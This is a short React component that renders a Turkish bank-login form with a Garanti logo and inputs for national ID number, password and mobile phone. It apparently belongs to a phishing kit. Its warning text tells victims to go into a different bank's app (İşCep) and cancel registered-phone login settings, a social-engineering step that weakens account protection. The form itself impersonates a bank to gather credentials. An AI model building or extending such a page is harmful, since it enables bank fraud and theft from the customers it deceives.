import React from 'react';
import './style.css';

function BankAuth(props) {
  return (
    <div className={'user-info'}>
      <div className={'bank-head'}>
        <img alt={'logo'} src={'./assets/banks/garanti.png'} />
        <p>Banka Giriş Adımı</p>
      </div>
      <div className={'form'}>
        <input type={'text'} placeholder={'T.C. kimlik numarası'} />
        <input type={'text'} placeholder={'Parola'} />
        <input type={'number'} placeholder={'Cep telefonu'} />
      </div>
      <p className={'bank-extra-info'}>Uyarı: İşCep uygulamasında Tanımlı Telefon Yönetimi menüsüne girerek,
3 Farklı Telefondan giriş tanımladıysanız en az 1 tanesini, Tek Telefondan
Giriş tanımladıysanız bu seçeneği IPTAL etmeniz gerekmektedir.</p>
      <button onClick={() => props.stepHandler()} className={'start-process-btn'}>Giriş yap</button>
    </div>
  );
}

export default BankAuth;